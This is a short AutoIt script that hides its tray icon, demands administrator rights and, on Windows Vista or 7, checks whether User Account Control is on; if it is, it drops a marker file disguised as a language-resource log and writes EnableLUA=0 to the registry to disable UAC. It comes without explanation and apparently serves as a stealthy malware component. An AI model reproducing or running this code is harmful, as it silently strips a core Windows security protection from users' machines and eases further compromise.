#NoTrayIcon
#RequireAdmin
Opt("TrayIconHide", 1)
$a = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$b = "EnableLUA"
$c = "REG_DWORD"
$d = "0"
$var = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA")
if StringInStr("WIN_VISTA|WIN_7", @OSVersion) then
If $var <> 0 Then 
    FileWrite (@CommonFilesDir & "\System\en-US\mui\log.txt","Text")
    RegWrite($a, $b, $c, $d)
Else
    Exit
EndIf

EndIf